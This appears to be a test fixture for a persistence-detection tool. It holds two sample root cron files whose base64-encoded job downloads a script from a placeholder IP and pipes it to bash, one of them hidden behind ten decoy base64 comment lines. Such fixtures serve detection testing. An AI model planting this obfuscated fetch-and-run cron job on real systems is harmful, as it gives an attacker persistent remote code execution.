  - path: case1/etc/cron.d/job
    text: "# blob00 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMCBvaw==\n# blob01 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMSBvaw==\n# blob02 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMiBvaw==\n# blob03 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMyBvaw==\n# blob04 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNCBvaw==\n# blob05 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNSBvaw==\n# blob06 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNiBvaw==\n# blob07 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNyBvaw==\n# blob08 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOCBvaw==\n# blob09 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOSBvaw==\n*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
  - path: case2/etc/cron.d/job
    text: "*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
steps:
  - tool: find_persistence
    note_ko: "결함이 있는 호출: 앞에 base64 10개가 있는 파일"
